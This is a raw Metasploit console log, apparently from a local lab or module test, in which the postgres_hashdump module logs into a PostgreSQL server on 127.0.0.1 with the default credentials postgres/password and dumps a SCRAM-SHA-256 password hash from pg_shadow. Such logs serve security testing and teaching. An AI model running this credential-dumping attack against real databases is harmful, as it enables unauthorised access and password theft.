use auxiliary/scanner/postgres/postgres_hashdump
Stopping all jobs...
[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_hashdump[0m) [0m> run lhost=127.0.0.1 username=postgres password=password rhost=127.0.0.1 rport=5432 Verbose=true
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_hashdump[0m) [0m> [+] 127.0.0.1:5432 Postgres - Logged in to 'postgres' with 'postgres':'password'
[*] 127.0.0.1:5432 Postgres - querying with 'SELECT usename, passwd FROM pg_shadow'
[!] No active DB -- Credential data will not be saved!
[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username  Hash
 --------  ----
 postgres  SCRAM-SHA-256$4096:sjk2utYRzkZD/fTrjq535w==$fkTX6lZVin+pp7pYwoOiJMuu5C0oZirz6W+P6eBIVBI=:l//qaFM82oeFhCbH6UMxYeytYY2Tub6Kxf31zrHUzrY=

[*] 127.0.0.1:5432 Postgres - Disconnected
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_hashdump[0m) [0m> sessions -K
jobs -K
[*] Killing all sessions...
[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_hashdump[0m) [0m> 